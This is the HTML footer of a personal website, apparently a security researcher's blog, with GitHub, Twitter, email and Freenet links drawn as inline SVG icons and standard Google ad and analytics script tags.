  <div class="wrapper">

      <div class="site-footer">
        <ul class="social-media-list">
          
          <li>
            <a href="https://github.com/m101"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="https://twitter.com/w_levin"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="mailto:m101.sec@gmail.com"><span class="icon icon--email"><?xml version="1.0" encoding="UTF-8"?>
<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="240.665px" height="250px" viewBox="43.833 205.167 240.665 250" enable-background="new 43.833 205.167 240.665 250" xml:space="preserve">
<g>
	<path fill="#323232" d="M221.459,396.62c-8.84,0-15.904-2.21-21.191-6.63c-5.289-4.42-8.449-10.441-9.488-18.07   c-4.855,5.895-10.66,10.965-17.42,15.21c-6.762,4.249-14.561,6.37-23.4,6.37c-6.59,0-12.83-1.256-18.72-3.77   c-5.895-2.512-11.095-6.15-15.6-10.92c-4.509-4.766-8.105-10.571-10.79-17.42c-2.689-6.846-4.03-14.69-4.03-23.531   c0-9.879,1.56-19.064,4.68-27.56c3.12-8.49,7.365-15.86,12.74-22.1c5.371-6.24,11.7-11.136,18.98-14.69   c7.28-3.551,15.08-5.33,23.4-5.33c9.01,0,16.68,1.82,23.01,5.461c6.324,3.639,11.311,8.234,14.949,13.779l2.34-17.42h20.541   l-10.66,85.02c-0.52,3.99-0.781,7.021-0.781,9.101c0,5.029,1.041,8.929,3.121,11.7c2.08,2.774,5.545,4.16,10.4,4.16   c4.504,0,8.84-1.646,13-4.94c4.16-3.29,7.799-7.931,10.92-13.91c3.119-5.979,5.589-13.085,7.41-21.319   c1.82-8.23,2.729-17.291,2.729-27.17c0-11.961-2.123-23.051-6.369-33.281c-4.25-10.225-10.228-19.064-17.939-26.52   c-7.715-7.451-16.859-13.26-27.43-17.42c-10.576-4.16-22.189-6.24-34.842-6.24c-16.119,0-30.464,3.165-43.029,9.49   c-12.57,6.33-23.14,14.605-31.72,24.83c-8.58,10.229-15.08,21.799-19.5,34.71c-4.42,12.915-6.63,26.045-6.63,39.39   c0,15.08,2.34,28.516,7.02,40.301c4.68,11.789,11.18,21.795,19.5,30.029c8.32,8.23,18.11,14.471,29.38,18.721   c11.265,4.244,23.485,6.369,36.661,6.369c13.17,0,24.914-1.561,35.229-4.68c10.311-3.121,20.15-6.936,29.512-11.439l7.539,19.76   c-9.016,4.85-19.891,8.924-32.631,12.219c-12.738,3.291-26.479,4.941-41.209,4.941c-16.64,0-31.98-2.516-46.02-7.541   c-14.04-5.029-26.175-12.439-36.4-22.23c-10.229-9.795-18.2-21.84-23.92-36.139c-5.72-14.301-8.58-30.811-8.58-49.53   c0-17.331,2.99-33.841,8.97-49.53c5.98-15.686,14.471-29.51,25.48-41.47c11.005-11.96,24.266-21.45,39.78-28.47   c15.51-7.02,32.889-10.53,52.129-10.53c16.291,0,31.156,2.645,44.59,7.93c13.432,5.29,24.916,12.524,34.451,21.71   c9.529,9.189,16.898,20.064,22.1,32.63c5.199,12.568,7.799,26.129,7.799,40.689c0,12.48-1.518,23.965-4.549,34.45   c-3.035,10.489-7.195,19.5-12.48,27.04c-5.289,7.54-11.615,13.391-18.98,17.55C238.139,394.54,230.124,396.62,221.459,396.62z    M156.979,374.26c6.76,0,13-1.86,18.721-5.59c5.719-3.725,10.311-7.756,13.779-12.09l6.24-51.48   c-3.469-5.545-7.975-10.051-13.52-13.52c-5.551-3.465-11.875-5.2-18.98-5.2c-5.201,0-10.23,1.17-15.08,3.511   c-4.855,2.34-9.145,5.635-12.87,9.879c-3.729,4.25-6.675,9.32-8.84,15.211c-2.169,5.895-3.25,12.395-3.25,19.5   c0,13.174,3.291,23.1,9.88,29.77C139.645,370.925,147.62,374.26,156.979,374.26z"/>
</g>
</svg></span></a>

          </li>
          

          
          <li>
            <a href="http://127.0.0.1:8888/USK@ABR8mm2t1L1G8cBG70cDy4PHFO6LPV~LrA-RIZxgOGI,pnGWUxb7k8~5-ywwqnBakTXx5ZFw6QzzZj7H~45NgE8,AQACAAE/binholic/-1/"><span class="icon icon--freenet"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   version="1.0"
   width="79.12"
   height="52.64">
  <defs/>
  <g
     transform="translate(-47.495719,-111.30691)">
    <path
       d="M 80.03,122.66 C 94.49,107.06 104.32,113.99 87.53,124.89 C 82.19,128.36 83.58,129.37 87.17,128.82 C 92.24,128.05 95.01,129.02 96.24,129.98 C 99.18,132.28 100.65,130.57 101.64,128.82 C 103.61,125.35 110.25,129.12 105.39,132.75 C 101.59,135.58 102.12,138.77 105.57,140.61 C 111.96,144.01 126.30,150.75 124.14,157.93 C 123.26,160.86 121.67,163.62 118.07,159.89 C 111.32,152.92 106.83,146.97 91.28,144.54 C 81.24,142.96 71.15,140.33 61.46,145.25 C 56.90,147.67 51.16,149.23 49.94,146.37 C 48.35,142.64 56.47,139.57 64.32,138.82 C 69.42,138.33 73.99,134.99 67.00,133.29 C 58.39,130.64 68.28,123.09 74.50,124.89 C 78.55,126.07 78.95,123.83 80.03,122.66 z"
       style="fill:#ffffff;stroke:#356ace;stroke-width:1.5;" />
  </g>
</svg>
</span></a>

          </li>
          
        </ul>
      </div>

    </div>

  </div>

</footer>

<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-9302170278788846",
          enable_page_level_ads: true
     });
</script>


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-16686496-2');
</script>



  </body>

</html>
